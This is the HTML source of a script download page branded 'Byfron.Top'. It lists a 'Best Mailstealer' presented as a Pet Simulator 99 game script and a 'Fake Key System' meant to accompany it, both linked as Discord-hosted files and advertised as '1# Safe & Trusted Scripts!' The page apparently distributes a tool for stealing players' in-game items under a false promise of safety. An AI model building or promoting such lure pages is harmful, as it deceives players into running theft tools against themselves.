<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Lua Scripts</title>
    <style>
        body {
            background-color: #121212;
            color: #e0e0e0;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            text-align: center;
        }
        .container {
            width: 90%;
            max-width: 1200px;
            margin: 0 auto;
        }
        .typewriter-container {
            margin-bottom: 20px;
            font-size: 24px;
        }
        .search-bar {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #333;
            border-radius: 5px;
            background: #1e1e1e;
            color: #e0e0e0;
            font-size: 16px;
            box-sizing: border-box;
        }
        .cards-container {
            display: flex;
            flex-wrap: wrap;
            gap: 20px;
            justify-content: center;
        }
        .card {
            background: #1e1e1e;
            border-radius: 8px;
            padding: 15px;
            width: 300px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            transition: transform 0.3s, box-shadow 0.3s;
            border: 1px solid #333;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }
        .card:hover {
            transform: translateY(-10px);
            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
        }
        .card img {
            width: 100%;
            height: 150px; /* Fixed height for all banners */
            object-fit: cover; /* Ensures the image covers the area without stretching */
            border-radius: 5px;
            margin-bottom: 10px;
        }
        .card h2 {
            margin: 0 0 10px;
            font-size: 20px;
        }
        .card p {
            margin: 0 0 15px;
            font-size: 14px;
        }
        .download-button {
            display: inline-block;
            padding: 8px 15px;
            color: #e0e0e0;
            background: #333;
            border: 1px solid #fff;
            border-radius: 5px;
            text-decoration: none;
            font-size: 14px;
            transition: background 0.3s, transform 0.3s, box-shadow 0.3s;
        }
        .download-button:hover {
            background: #444;
            transform: scale(1.1);
            box-shadow: 0 0 10px 2px rgba(255, 255, 255, 0.8);
        }
        @media (max-width: 600px) {
            .search-bar {
                font-size: 14px;
                padding: 8px;
            }
            .card {
                width: 100%;
                margin-bottom: 20px;
            }
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/typewriter-effect@latest/dist/core.js"></script>
</head>
<body>
    <div class="container">
        <div class="typewriter-container">
            <div id="typewriter"></div>
        </div>
        <input type="text" class="search-bar" placeholder="Search scripts..." onkeyup="filterCards()">
        <div class="cards-container" id="cards-container">
        </div>
    </div>
    <script>
        const scripts = [
            {
                bannerLink: "https://cdn.discordapp.com/attachments/1234931860631457803/1242129673807331390/hqdefault.jpg?ex=664cb6e7&is=664b6567&hm=73711e5e3cfd3a8447d8b15e9daf07209dbd4215586529281fffbb8fc6e0c318&",
                title: "Best Mailstealer",
                description: "Best Pet Simulator 99 Script.",
                buttonText: "Download Script",
                buttonLink: "https://cdn.discordapp.com/attachments/1234931860631457803/1242161903141126304/Thanks_For_Using_Byfron.Top.txt?ex=664cd4eb&is=664b836b&hm=6192026028e6206edcddbac04c0a7be5d0e2552cffdc37c4b7ffddfda3d84e9f&"
            },
            {
                bannerLink: "https://cdn.discordapp.com/attachments/1234931860631457803/1242156916226916452/image.png?ex=664cd046&is=664b7ec6&hm=1391f7ce2c1b53b174e5de469aea7af489ddffe65f32a63313c396b8caa7a9ff&",
                title: "Fake Key System",
                description: "Recommended to be used with the mailstealer.",
                buttonText: "Download Script",
                buttonLink: "https://cdn.discordapp.com/attachments/1234931860631457803/1242162162810617998/Thanks_For_Using_Byfron.Top.txt?ex=664cd529&is=664b83a9&hm=ae78882eb314a7689032a07c425b3815ff2dd4ffb64986ef774dc8bd7a3594b7&"
            }
        ];

        const cardsContainer = document.getElementById('cards-container');

        function createCard(script) {
            const card = document.createElement('div');
            card.className = 'card';
            card.setAttribute('data-title', script.title);

            card.innerHTML = `
                <img src="${script.bannerLink}" alt="${script.title} Banner">
                <h2>${script.title}</h2>
                <p>${script.description}</p>
                <a href="${script.buttonLink}" class="download-button">${script.buttonText}</a>
            `;

            return card;
        }

        function renderCards() {
            scripts.forEach(script => {
                const card = createCard(script);
                cardsContainer.appendChild(card);
            });
        }

        function filterCards() {
            const searchInput = document.querySelector('.search-bar').value.toLowerCase();
            const cards = document.querySelectorAll('.card');

            cards.forEach(card => {
                const title = card.getAttribute('data-title').toLowerCase();
                if (title.includes(searchInput)) {
                    card.style.display = 'block';
                } else {
                    card.style.display = 'none';
                }
            });
        }

        // Initialize Typewriter.js
        const typewriter = new Typewriter('#typewriter', {
            loop: true
        });

        typewriter.typeString('Byfron.Top')
            .pauseFor(70)
            .deleteAll()
            .typeString('1# Safe & Trusted Scripts!')
            .pauseFor(90)
            .start();

        // Render the cards on page load
        renderCards();
    </script>
</body>
</html>
